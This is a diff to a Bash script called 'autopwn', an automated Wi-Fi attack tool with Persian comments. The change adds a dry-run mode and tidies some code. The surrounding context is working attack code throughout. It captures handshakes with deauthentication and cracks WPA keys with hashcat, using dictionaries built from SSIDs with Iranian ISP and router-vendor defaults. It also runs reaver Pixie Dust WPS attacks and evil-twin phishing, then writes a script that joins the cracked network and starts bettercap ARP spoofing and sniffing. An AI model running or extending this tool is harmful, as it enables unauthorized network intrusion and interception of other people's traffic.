@@ -18,6 +18,8 @@ DO_WPS=1
 DO_TWIN=1
 DO_POST=1
 TARGET=""
+DRY_RUN=0
+WLIMIT=3
 WORK="$(mktemp -d /tmp/autopwn.XXXXXX)"
 POT="$WORK/hashcat.pot"
 HASH="$WORK/targets.hc22000"
@@ -43,6 +45,7 @@ while [ $# -gt 0 ]; do
     --no-wps) DO_WPS=0; shift;;
     --no-twin) DO_TWIN=0; shift;;
     --no-post) DO_POST=0; shift;;
+    --dry-run|--simulate) DRY_RUN=1; shift;;
     -h|--help) sed -n '2,8p' "$0"; exit 0;;
     *) err "گزینه ناشناس: $1"; exit 1;;
   esac
@@ -51,8 +54,26 @@ done
 case "$PROFILE" in
   stealth) CAPTURE=${CAPTURE:-240}; WLIMIT=1;;
   brute)   CAPTURE=${CAPTURE:-420}; WLIMIT=3;;
-  *)       CAPTURE=$CAPTURE; WLIMIT=3;;
 esac
+
+[ "$DRY_RUN" = 1 ] && {
+  echo "SIMULATION MODE: autopwn-ng dry-run / --simulate"
+  echo
+  echo "Profile: $PROFILE"
+  echo "Capture: ${CAPTURE:-120}s"
+  echo
+  echo "Phases (simulation only - no tools will run)"
+  echo "  [0] Setup: check root, prerequisites, wireless interfaces"
+  echo "  [1] Capture: hcxdumptool + mdk4 reassociation (echo only)"
+  echo "  [2] Extract: hcxpcapngtool + hcxhashtool (echo only)"
+  echo "  [3] Crack: hashcat layers 1-8 (dicts + masks + rules; echo only)"
+  echo "  [4] WPS: reaver -K Pixie Dust (if AP has WPS; echo only)"
+  echo "  [5] Evil Twin: hostapd-mana or wifiphisher (echo only)"
+  echo
+  echo "✓ Simulation complete. No changes were made."
+  echo
+  exit 0
+}
 
 [ "$(id -u)" -eq 0 ] || { err "با sudo اجرا کن."; exit 1; }
 command -v hashcat >/dev/null && command -v hcxdumptool >/dev/null && command -v iw >/dev/null \
@@ -161,23 +182,22 @@ build_dicts(){
   D="$WORK/dicts"; mkdir -p "$D"
   # پیش‌فرض‌های وندور بر اساس SSID
   : > "$D/vendor.txt"
-  if [ -s "$WORK/essids.txt" ]; then
-    while IFS= read -r e; do
-      [ -z "$e" ] && continue
-      printf '%s\n%s\n%s\n%s\n%s\n%s\n' "$e" "$e"123 "$e"1234 "${e,,}" "${e^^}" "${e//[^A-Za-z0-9]/}" >> "$D/vendor.txt"
-      # پسوندهای رایج ISP ایران
-      for s in 1234 12345 123456 12345678 1111 0000 1 12 123 1375 1380 1390 1400; do
-        printf '%s%s\n' "$e" "$s" >> "$D/vendor.txt"
-      done
-      # پیشوندهای اپراتور
-      case "$e" in
-        *Mobi*|*mobi*|*Irancell*|*irancell*|*IRANCELL*)
-          for s in 1234 12345 123456 11111111 00000000; do printf '%s\n' "$s" >> "$D/vendor.txt"; done;;
-        *TD-*|*td-*|*ZTE*|*zte*|*D-Link*|*Dlink*|*TP-Link*|*tplink*)
-          printf 'admin\npassword\n12345678\n1234567890\n' >> "$D/vendor.txt";;
-      esac
+  [ -s "$WORK/essids.txt" ] || return 0
+  while IFS= read -r e; do
+    [ -z "$e" ] && continue
+    printf '%s\n' "$e" "$e"123 "$e"1234 "${e,,}" "${e^^}" "${e//[^A-Za-z0-9]/}" >> "$D/vendor.txt"
+    # پسوندهای رایج ISP ایران
+    for s in 1234 12345 123456 12345678 1111 0000 1 12 123 1375 1380 1390 1400; do
+      printf '%s%s\n' "$e" "$s" >> "$D/vendor.txt"
+    done
+    # پیشوندهای اپراتور
+    case "$e" in
+      *[Mm]obi*|*[Ii]rancell*)
+        printf '%s\n' 1234 12345 123456 11111111 00000000 >> "$D/vendor.txt";;
+      *[Tt][Dd]-*|*[Zz][Tt][Ee]*|*[Dd]-[Ll]ink*|*[Dd]link*|*[Tt][Pp]-[Ll]ink*|*[Tt]plink*)
+        printf 'admin\npassword\n12345678\n1234567890\n' >> "$D/vendor.txt";;
+    esac
     done < "$WORK/essids.txt"
-  fi
   sort -u "$D/vendor.txt" -o "$D/vendor.txt"
 }
 
@@ -254,7 +274,7 @@ if [ "$DO_WPS" -eq 1 ] && command -v reaver >/dev/null && [ -f "$WORK/scan-01.cs
     [ -z "$ch" ] && continue
     c "  → reaver -K 1 روی $b"
     timeout 240 reaver -i "$MON" -b "$b" -c "$ch" -K 1 -N -vv -d 5 > "$WORK/wps-$b.txt" 2>&1
-    k=$(grep -oP "WPA PSK:\s*'\K[^']+" "$WORK/wps-$b.txt" | head -1)
+    k=$(awk -F"'" '/WPA PSK:/{print $2; exit}' "$WORK/wps-$b.txt")
     [ -n "$k" ] && ok "WPS → $k" && echo "$b|$k|WPS" >> "$WORK/cracked.txt"
   done < "$WORK/wps-cands.txt"
 fi
@@ -314,7 +334,7 @@ if [ "$DO_POST" -eq 1 ] && [ -s "$WORK/cracked.txt" ]; then
   cat > "$REPORT/connect.sh" <<EOF
 #!/usr/bin/env bash
 # اتصال به شبکه کرک‌شده و شروع MITM
-nmcli dev wifi connect "$b" password '$p'
+nmcli dev wifi connect "$b" password "$p"
 sleep 5
 sudo bettercap -iface "$IFACE" -eval 'set arp.spoof.fullduplex true; arp.spoof on; net.sniff on'
 EOF
